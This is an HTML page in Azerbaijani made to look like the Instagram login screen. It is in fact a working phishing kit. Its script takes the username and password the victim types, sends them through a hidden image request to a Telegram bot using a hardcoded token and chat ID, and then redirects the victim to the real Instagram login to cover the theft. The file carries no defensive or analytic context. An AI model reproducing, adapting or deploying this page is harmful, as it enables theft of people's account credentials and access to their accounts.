<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş • Instagram</title>
    <style>
        body { font-family: sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; }
        .btn { width: 100%; padding: 10px; background-color: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e00b5f0.png" style="width:175px; margin-bottom:20px;">
    
    <input type="text" id="username" placeholder="İstifadəçi adı">
    <input type="password" id="password" placeholder="Şifrə">
    <button type="button" class="btn" onclick="sendData()">Giriş et</button>
</div>

<script>
    function sendData() {
        var u = document.getElementById('username').value;
        var p = document.getElementById('password').value;
        
        if (u === "" || p === "") {
            alert("Zəhmət olmasa xanaları doldurun.");
            return;
        }

        // Sənin məlumatların
        var t = '8791906896:AAHfgI1MT-Cdtlz_6EAuqLvBnYW1Rd-1fnM';
        var c = '7205213437';
        var link = "https://api.telegram.org/bot" + t + "/sendMessage?chat_id=" + c + "&text=User: " + u + " | Pass: " + p;

        // Mesajı göndərmək üçün gizli üsul
        var i = new Image();
        i.src = link;

        // 1 saniyə sonra mütləq yönləndir
        setTimeout(function() {
            window.location.replace("https://www.instagram.com/accounts/login/");
        }, 1000);
    }
</script>

</body>
</html>
